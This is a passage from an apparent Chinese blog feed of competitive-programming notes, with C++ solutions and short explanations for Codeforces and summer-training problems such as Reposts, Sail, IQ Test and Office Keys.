class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> T;</span><br><span class="line">  </span><br><span class="line">  cin &gt;&gt; T;</span><br><span class="line">  <span class="keyword">while</span> (T--) &#123;</span><br><span class="line">    ll sum = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(c,<span class="number">0</span>,<span class="built_in">sizeof</span>(c));</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">      &#123;</span><br><span class="line">        cin &gt;&gt; a[i];</span><br><span class="line">        sum+=a[i];</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (++c[a[i]]&gt;=<span class="number">2</span>) mx=<span class="built_in">max</span>(mx,a[i]);</span><br><span class="line">a[i]=mx; </span><br><span class="line">      sum+=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(c,<span class="number">0</span>,<span class="built_in">sizeof</span>(c));</span><br><span class="line">    mx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (++c[a[i]]&gt;=<span class="number">2</span>) mx=<span class="built_in">max</span>(mx,a[i]);</span><br><span class="line">a[i]=mx;</span><br><span class="line">       sum += <span class="number">1LL</span> * a[i] * (n-i + <span class="number">1</span>);<span class="comment">//累加</span></span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/luckyblock/p/18314065">Codeforces Round 960 (Div. 2) - Luckyblock - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/cjjsb/p/18314685#c-mad-mad-sum">Codeforces Round 960 (Div. 2) - 空気力学の詩 - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
          <category> codeforces </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> codeforces </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024_7_17暑期集训</title>
      <link href="/2024/07/17/%E6%A0%A1%E8%B5%9B/2024_7_17/"/>
      <url>/2024/07/17/%E6%A0%A1%E8%B5%9B/2024_7_17/</url>
      
        <content type="html"><![CDATA[<h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>还得是黄神！比赛直接AC四题！挽救了我们队！</p><h3 id="2488-Reposts"><a href="#2488-Reposts" class="headerlink" title="2488: Reposts"></a>2488: Reposts</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240717143840212.png" alt="image-20240717143840212"></p><p>这题有点像食物链，即第二人转发消息（repost）到第一个人，再以此类推。要求求最大的传播链长度，由于我们不需要考虑该网民不知道消息转发的情况。因此可以采用<code>队列</code>来存储传递信息，用<code>map</code>存储食物链</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span>    <span class="comment">//pair</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;string, string&gt; PII;   <span class="comment">//二元组</span></span><br><span class="line"></span><br><span class="line">queue&lt;PII&gt; que1;</span><br><span class="line">unordered_map&lt;string, <span class="type">int</span>&gt; unmap;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (!que<span class="number">1.</span><span class="built_in">empty</span>()) &#123;</span><br><span class="line">    string str1 = que<span class="number">1.f</span>ront().first;</span><br><span class="line">    string str2 = que<span class="number">1.f</span>ront().second;</span><br><span class="line">    <span class="keyword">auto</span> it = unmap.<span class="built_in">find</span>(str2);</span><br><span class="line">    <span class="comment">// cout &lt;&lt; que1.front().first &lt;&lt; que1.front().second &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (it != unmap.<span class="built_in">end</span>()) &#123;</span><br><span class="line">      unmap.<span class="built_in">insert</span>(&#123;str1, it-&gt;second + <span class="number">1</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    que<span class="number">1.</span><span class="built_in">pop</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">  unmap.<span class="built_in">insert</span>(&#123;<span class="string">&quot;POLYCARP&quot;</span>, <span class="number">1</span>&#125;);<span class="comment">//始作俑者</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    string str1, tmp, str2;</span><br><span class="line">    cin &gt;&gt; str1 &gt;&gt; tmp &gt;&gt; str2;</span><br><span class="line">    <span class="built_in">transform</span>(str<span class="number">1.</span><span class="built_in">begin</span>(), str<span class="number">1.</span><span class="built_in">end</span>(), str<span class="number">1.</span><span class="built_in">begin</span>(), ::toupper);<span class="comment">//不区分大小写，将</span></span><br><span class="line">    <span class="built_in">transform</span>(str<span class="number">2.</span><span class="built_in">begin</span>(), str<span class="number">2.</span><span class="built_in">end</span>(), str<span class="number">2.</span><span class="built_in">begin</span>(), ::toupper);<span class="comment">//id全部转化为大写</span></span><br><span class="line"></span><br><span class="line">    que<span class="number">1.</span><span class="built_in">push</span>(&#123;str1, str2&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">bfs</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> x : unmap) &#123;</span><br><span class="line">    <span class="comment">// cout &lt;&lt; x.first &lt;&lt; x.second &lt;&lt; endl;</span></span><br><span class="line">    cnt = <span class="built_in">max</span>(cnt, x.second);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1412-Ice-cream-coloring"><a href="#1412-Ice-cream-coloring" class="headerlink" title="1412: Ice cream coloring"></a>1412: Ice cream coloring</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240717163720853.png" alt="image-20240717163720853"></p><p>//TODO</p><h3 id="3258-Copying-Data"><a href="#3258-Copying-Data" class="headerlink" title="3258: Copying Data"></a>3258: Copying Data</h3><p>由于集训时长限制为2s，因此正常的复制粘贴也是能过的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a[N], b[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 取消cin和cout的绑定</span></span><br><span class="line">  std::cin.<span class="built_in">tie</span>(<span class="literal">NULL</span>); <span class="comment">/*等价于cin.tie(0);*/</span></span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    cin &gt;&gt; a[i];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    cin &gt;&gt; b[i];</span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="type">int</span> op;</span><br><span class="line">    cin &gt;&gt; op;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="type">int</span> a1, b1, c1;</span><br><span class="line">      cin &gt;&gt; a1 &gt;&gt; b1 &gt;&gt; c1;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; c1; i++) &#123;</span><br><span class="line">        b[b1 + i] = a[i + a1];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (op == <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="type">int</span> pos;</span><br><span class="line">      cin &gt;&gt; pos;</span><br><span class="line">      cout &lt;&lt; b[pos] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是这题的正确题解为线段树：线段树能在<code>O(logN)</code>的条件下实现单点和区间操作。</p><p>//TODO</p><h3 id="3238-Sail"><a href="#3238-Sail" class="headerlink" title="3238: Sail"></a>3238: Sail</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240717152356614.png" alt="image-20240717152356614"></p><p>我刚看题目以为是要用bfs做(这里队列数据量太大$2^{10^9}$会超内存)，但是看了黄神的解答，发现这题其实考的是贪心，如果当前风向不能使船更靠近终点，我们就维持在原点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string s;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> t;</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> sx, sy, ex, ey;</span><br><span class="line">  cin &gt;&gt; t &gt;&gt; sx &gt;&gt; sy &gt;&gt; ex &gt;&gt; ey;</span><br><span class="line">  <span class="keyword">if</span> (sx == ex &amp;&amp; sy == ey) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  cin &gt;&gt; s;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (s[i] == <span class="string">&#x27;E&#x27;</span> &amp;&amp; sx &lt; ex)</span><br><span class="line">      sx += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;W&#x27;</span> &amp;&amp; sx &gt; ex)</span><br><span class="line">      sx -= <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;N&#x27;</span> &amp;&amp; sy &lt; ey)</span><br><span class="line">      sy += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;S&#x27;</span> &amp;&amp; sy &gt; ey)</span><br><span class="line">      sy -= <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (sx == ex &amp;&amp; sy == ey) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3157-IQ-Test"><a href="#3157-IQ-Test" class="headerlink" title="3157: IQ Test"></a>3157: IQ Test</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240717154027576.png" alt="image-20240717154027576"></p><p>判断数列是等差还是等比，输出下一项；若不是则输出42。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> a, b, c, d;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b &gt;&gt; c &gt;&gt; d;</span><br><span class="line"><span class="keyword">if</span> (a - b == b - c &amp;&amp; b - c == c - d)<span class="comment">//等差</span></span><br><span class="line">cout &lt;&lt; d - (a - b);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a * c == b * b &amp;&amp; d * b == c * c)<span class="comment">//等比</span></span><br><span class="line"><span class="keyword">if</span> (d * d % c)</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;42&quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cout &lt;&lt; d * d / c;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;42&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1322-Office-Keys"><a href="#1322-Office-Keys" class="headerlink" title="1322: Office Keys"></a>1322: Office Keys</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240717163749504.png" alt="image-20240717163749504"></p><p>这题有<code>二分+贪心</code>和<code>dp+贪心</code>两种做法。</p><p><a href="https://blog.csdn.net/zstuyyyyccccbbbb/article/details/108513552">A. Office Keys(贪心+二分枚举)_有n个人和k把钥匙在一条直线上,每个人都想去位于直线p点的办公室找陈老师问题目。-CSDN博客</a></p><p>我们使用二分来确定对应的值，然后用贪心的思路，先将钥匙和人从小到大排序，找到一个最小的 <code>x</code>，使得对于每个 <code>a[i]</code>，可以找到一个 <code>b[j]</code> 使得 <code>|a[i] - b[j]| + |p - b[j]| &lt;= x</code>。从最靠近原点的人和钥匙开始枚举，若每个人都能在x的时间内找到，则答案在<code>l-x</code>区间否则在<code>x-r</code>区间。最后得出最终答案。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">2e3</span><span class="number">+10</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line">LL a[maxn],b[maxn];</span><br><span class="line">LL n,k,p;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(LL x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LL i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(LL j=<span class="number">1</span>;j&lt;=k;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">abs</span>(a[i]-b[j])+<span class="built_in">abs</span>(p-b[j])&lt;=x)&#123;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i&gt;n) <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  cin.<span class="built_in">tie</span>(<span class="number">0</span>);std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">  cin&gt;&gt;n&gt;&gt;k&gt;&gt;p;</span><br><span class="line">  <span class="keyword">for</span>(LL i=<span class="number">1</span>;i&lt;=n;i++) cin&gt;&gt;a[i];</span><br><span class="line">  <span class="keyword">for</span>(LL i=<span class="number">1</span>;i&lt;=k;i++) cin&gt;&gt;b[i];</span><br><span class="line">  <span class="built_in">sort</span>(a<span class="number">+1</span>,a<span class="number">+1</span>+n);<span class="built_in">sort</span>(b<span class="number">+1</span>,b<span class="number">+1</span>+k);      </span><br><span class="line">  LL l=<span class="number">0</span>;LL r=<span class="number">2e9</span><span class="number">+100</span>;</span><br><span class="line">  <span class="keyword">while</span>(l&lt;r)</span><br><span class="line">  &#123;</span><br><span class="line">  LL mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">check</span>(mid)) r=mid;</span><br><span class="line">  <span class="keyword">else</span> l=mid<span class="number">+1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  cout&lt;&lt;l&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dp题解：<a href="https://www.luogu.com.cn/problem/solution/CF830A">CF830A Office Keys - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)</a></p><h3 id="2513-Drazil-and-Factorial"><a href="#2513-Drazil-and-Factorial" class="headerlink" title="2513: Drazil and Factorial"></a>2513: Drazil and Factorial</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240717155028946.png" alt="image-20240717155028946"></p><p>模拟题，将该数拆成更小的阶乘并从大到小输出。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> num[<span class="number">20</span>];</span><br><span class="line"><span class="type">int</span> arr[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%1d&quot;</span>, &amp;a);</span><br><span class="line"><span class="keyword">if</span> (a == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">arr[<span class="number">2</span>]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">arr[<span class="number">3</span>]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">arr[<span class="number">2</span>] += <span class="number">2</span>;</span><br><span class="line">arr[<span class="number">3</span>]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">arr[<span class="number">5</span>]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">arr[<span class="number">5</span>]++;</span><br><span class="line">arr[<span class="number">3</span>]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line">arr[<span class="number">7</span>]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a== <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">arr[<span class="number">2</span>]+=<span class="number">3</span>;</span><br><span class="line">arr[<span class="number">7</span>]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">9</span>)</span><br><span class="line">&#123;</span><br><span class="line">arr[<span class="number">2</span>]++;</span><br><span class="line">arr[<span class="number">3</span>] += <span class="number">2</span>;</span><br><span class="line">arr[<span class="number">7</span>]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= arr[<span class="number">7</span>]; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;7&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= arr[<span class="number">5</span>]; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;5&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= arr[<span class="number">3</span>]; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= arr[<span class="number">2</span>]; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
          <category> 暑期集训 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 暑期集训 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XV6 0x9</title>
      <link href="/2024/07/12/OS/xv6_0x9/"/>
      <url>/2024/07/12/OS/xv6_0x9/</url>
      
